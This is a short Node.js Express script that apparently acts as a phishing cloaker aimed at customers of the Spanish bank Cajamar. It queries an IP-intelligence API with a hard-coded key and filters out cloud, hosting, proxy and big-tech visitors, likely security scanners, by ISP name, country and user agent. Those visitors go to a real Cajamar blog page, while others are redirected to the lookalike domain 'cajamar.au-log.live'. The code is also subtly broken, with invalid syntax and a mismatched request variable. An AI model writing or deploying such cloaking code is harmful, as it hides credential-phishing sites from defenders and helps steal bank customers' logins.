const express = require('express')
const app = express()
app.all('/', (req, res) => {


    function async check(inf,dev) {
                  var info =inf
                  var device=dev
                    var country_code = info['country_code']
                    const threat = info['threat']
                    const asn = info['asn']
                    const isp_type = asn.type 
                    const isp_name = asn.name.toLowerCase()
                    const isProxy = threat.is_proxy
                    const isAbuser = threat.is_known_abuser 
                    const knowAttacker = threat.is_known_attacker
                    var ispName="POST"

                    const companys = ["Maxihost LLC", "Microsoft Corporation", "Microsoft", "Amazon", "Amazon.com, Inc.", "Google", "Google LLC", "Intelligence", "Artificial", "HOST", "Hosting", "colocation", "proxy", "data center"]
                    companys.forEach((item, i) => { if (isp_name.match(item.toLowerCase())) { ispName = "GET" } })


                    if (
                     // country_code !="IN" &&
                      country_code =="E1S" 
                      //  &&  country_code !="US" 
                  //  &&  country_code !="CL" 
                    && ispName == "POST" 
                //    && isProxy == false 
                  //  && isAbuser == false 
               //     && isp_type.toLowerCase() != "hosting" 
                 //   && isp_type.toLowerCase() != "business"  
                   // &&  knowAttacker == false
                    ) {

                        function detectMob() {
                            const toMatch = [
                                /Android/i,
                                /webOS/i,
                                /iPhone/i,
                                /iPad/i,
                                /iPod/i,
                                /BlackBerry/i,
                                /Windows Phone/i
                            ];
                         
                            return toMatch.some((toMatchItem) => {
                                 return device.match(toMatchItem);
                            });
                        }

                        function onlyTruster() {
                            const toMatch = [
                                /Windows 10.0/i,
                                /Windows 10/i,
                                /Windows 11/i,
                                /Windows 8/i,
                                /Windows 7/i,
                                /Mac Os/i,
                                /Windows/i,
                                /Linux/i,
                                /Windows NT/i
                            ];
                        
                            return toMatch.some((toMatchItem) => { 
                                 return device.match(toMatchItem);
                            });
                        }

                        const isM=detectMob()
                        const isDeviceTruster=onlyTruster()
                        const x11=device.toLowerCase().includes("x11")
                     //   console.log("is device truster: "+isDeviceTruster+"x11= "+x11)

                        if(x11==false)
                           { if(isM==true)
                            return "mobile"
                                else
                                return "pc"}
                                else 
                                return "bad"

                    } 
                    else {
                        return 'bad'
                    }
                    
                }




    const ip = request.headers.get('cf-connecting-ip') || request.headers.get('cf-connecting-ip')
  
 
    const key="c5f0c58519c44542c6f4119781a3f572488f269f5d12f907a3daa004"
// "https://api.ipdata.co/8.8.8.8?api-key=APIKEY"
    const userAgent = request.headers.get('user-agent');

    // Hacer un fetch a otra página 
     
    const response = await fetch(`https://api.ipdata.co/${ip}?api-key=${key}`);
    const content = await response.json();
    const checker = check(content,userAgent)
  

    // Evaluar el contenido de la respuesta
    //const checker='bad'
    if (checker=='pc' || checker=='mobile' ) {
        if(checker=='pc')
          res.redirect('https://cajamar.au-log.live/')
        else if(checker=='mobile')
          res.redirect('https://cajamar.au-log.live/')
    }else
        res.redirect('https://blog.grupocajamar.com/las-formas-de-entender-el-dinero-en-las-distintas-culturas/?gf=54806369')




    
     
})
app.listen(process.env.PORT || 3000)
